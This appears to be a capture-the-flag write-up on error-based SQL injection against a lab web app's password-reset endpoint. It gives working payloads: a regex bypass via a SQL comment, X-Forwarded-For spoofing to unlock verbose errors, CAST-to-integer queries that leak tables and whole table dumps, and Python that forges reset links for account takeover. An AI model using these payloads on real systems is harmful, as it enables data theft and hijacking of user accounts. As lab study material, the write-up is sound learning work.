# Error-Based SQL Injection

In-band technique: force the database to throw an error that includes the data you want to extract. Works when error messages are returned to the client.

---

## The Setup (BlueBird /forgot)

```java
Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");
// ...
String sql = "SELECT * FROM users WHERE email = '" + email + "'";
```

Two obstacles:
1. **Regex filter** — must match `<anything>@<alpha>.<alpha>`
2. **IP check for verbose errors** — only `127.0.1.1` gets the full stack trace

### Regex Bypass

The regex `^.*@[A-Za-z]*\\.[A-Za-z]*$` just requires `@<alpha>.<alpha>` anywhere. Append `--@bluebird.htb` as a SQL comment — this satisfies the regex while terminating the SQL query:

```
' OR 1=1--@bluebird.htb
```

### IP Bypass (X-Forwarded-For)

The code reads client IP from `X-Forwarded-For` header first, falling back to the real IP. Since this header is attacker-controlled:

```
X-Forwarded-For: 127.0.1.1
```

This enables the verbose error path, returning full stack traces with PostgreSQL error messages.

---

## Error-Based Extraction Technique

Force PostgreSQL to CAST a string to INT — it fails and prints the value in the error:

```sql
-- Leak database version
' AND 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb

-- Leak one table name
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--@bluebird.htb

-- Leak all table names at once
' AND 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables) AS INT)--@bluebird.htb
```

Error message format:
```
invalid input syntax for type integer: "PostgreSQL 13.10 ..."
```

The value after `integer:` is your extracted data.

---

## Stacked Queries + XML Dump

If stacked queries are supported, dump entire tables via XML in one shot:

```sql
';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb
```

Returns full XML table dump in the error message.

---

## Password Reset Link Reconstruction

The forgotPOST() reset link is built as:

```java
String passwordResetHash = DigestUtils.md5DigestAsHex(
    (id + ":" + email + ":" + password).getBytes()
);
String passwordResetLink = "https://bluebird.htb/reset?uid=" + id + "&code=" + passwordResetHash;
```

To reconstruct for any user — extract `id`, `email`, `password` (bcrypt hash) then:

```python
import hashlib
data = f"{id}:{email}:{password}"
code = hashlib.md5(data.encode()).hexdigest()
link = f"https://bluebird.htb/reset?uid={id}&code={code}"
```

---

## Exploit Flow Summary

1. Identify that `/forgot` reflects SQL errors when `X-Forwarded-For: 127.0.1.1`
2. Find regex bypass: append `--@bluebird.htb` to satisfy `@<alpha>.<alpha>` requirement
3. Use `CAST(<subquery> AS INT)` to force error-based data extraction
4. Chain extractions: get id, email, bcrypt hash for target user
5. Reconstruct reset link with `md5(id:email:hash)` as the code
